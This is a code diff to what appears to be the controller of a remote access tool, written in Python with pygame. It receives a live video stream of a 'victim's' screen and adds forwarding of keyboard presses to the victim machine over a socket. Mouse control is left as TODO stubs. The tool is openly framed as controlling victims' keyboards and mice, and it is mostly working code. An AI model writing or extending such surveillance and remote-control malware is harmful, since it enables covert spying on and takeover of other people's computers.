@@ -39,17 +39,21 @@ def toggleVideo(state, mainSock):
 	Enable/disable control of victim's keyboard
 	Expects True/False argument for whether to control keyboard
 """
-def toggleKeyboard(state):
+def toggleKeyboard(state, mainSock):
 	global keyboardControl
 	keyboardControl = state
+	if state: # make sure video stream is on if controlling keyboard
+		toggleVideo(state, mainSock)
 
 """
 	Enable/disable control of victim's mouse
 	Expects True/False argument for whether to control mouse
 """
-def toggleMouse(state):
+def toggleMouse(state, mainSock):
 	global mouseControl
 	mouseControl = state
+	if state: # make sure video stream is on if controlling mouse
+		toggleVideo(state, mainSock)
 
 """
 	Create a class to handle all the pygame-based functionality
@@ -125,13 +129,13 @@ def pygameHandler(videoSock, mainSock):
 			# do this only when we need the next frame's info
 			if fileSize == 0:
 				data = videoSock.recv(12)
-				baseWidth = int.from_bytes(data[0:4], byteorder='little', signed=True)
-				baseHeight = int.from_bytes(data[4:8], byteorder='little', signed=True)
-				fileSize = int.from_bytes(data[8:12], byteorder='little', signed=True)
-				print(f'File size is {fileSize} with resolution of {baseWidth} x {baseHeight}')
+				baseWidth = int.from_bytes(data[0:4], byteorder='big', signed=True)
+				baseHeight = int.from_bytes(data[4:8], byteorder='big', signed=True)
+				fileSize = int.from_bytes(data[8:12], byteorder='big', signed=True)
+				#print(f'File size is {fileSize} with resolution of {baseWidth} x {baseHeight}')
 			# get remaining frame data (RGB bytes)
 			data = videoSock.recv(fileSize-len(buff))
-			print(f'Recieved {len(data)} bytes')
+			#print(f'Recieved {len(data)} bytes')
 			if len(data) > 0:
 				buff = buff + data
 			if len(buff) >= fileSize:
@@ -159,14 +163,16 @@ def pygameHandler(videoSock, mainSock):
 			# TODO - connection closed
 			print("Connection closed! TODO - Exit program...")
 			pygameThreadRun = False
+		"""
 		if fileSize != 0:
 			percent = int(len(buff) * 100 / fileSize)
 			print(f'Buffer is {percent}% full')
 		else:
 			print('Buffer has been filled')
+		"""
 		if surf != None and dirty:
 			# print what frame is being displayed - used for debug
-			print(f"Displaying frame {frames}")
+			#print(f"Displaying frame {frames}")
 			frames += 1
 			# draw the new frame in the center of the window and update the display
 			screen.fill((0, 0, 0))
@@ -185,7 +191,7 @@ def pygameHandler(videoSock, mainSock):
 		for event in pygame.event.get():
 			if event.type == pygame.QUIT: # was the windows closed?
 				return
-			elif event.type == pygame.KEYDOWN:
+			elif event.type == pygame.KEYDOWN: # key was pressed down
 				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
 					dirty = True # assume that the image is mooved or resized
 					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
@@ -211,5 +217,24 @@ def pygameHandler(videoSock, mainSock):
 							zoom = 1.0
 					else: # image wasn't moved or resized - set dirty bit back to false
 						dirty = False
+				elif keyboardControl: # right control was not pressed down and we're sending keyboard inputs
+					if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
+						code = KEY_DICT[event.key]
+						mainSock.sendall(bytes([KEY_DOWN, code]) + b'\0')
+					else: # TODO - debugging purposes only
+						print("Key does not map to Windows virtual-key code!")
+			elif event.type == pygame.KEYUP and keyboardControl: # key was released and we're sending keyboard inputs
+				if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
+					code = KEY_DICT[event.key]
+					mainSock.sendall(bytes([KEY_UP, code]) + b'\0')
+				else: # TODO - debugging purposes only
+					print("Key does not map to Windows virtual-key code!")
+			elif event.type == pygame.MOUSEMOTION and mouseControl:
+				print("TODO")
+			elif event.type == pygame.MOUSEBUTTONDOWN and mouseControl:
+				print("TODO")
+			elif event.type == pygame.MOUSEBUTTONUP and mouseControl:
+				print("TODO")
+
 	# we've broken out of the loop
 	pygame.quit()
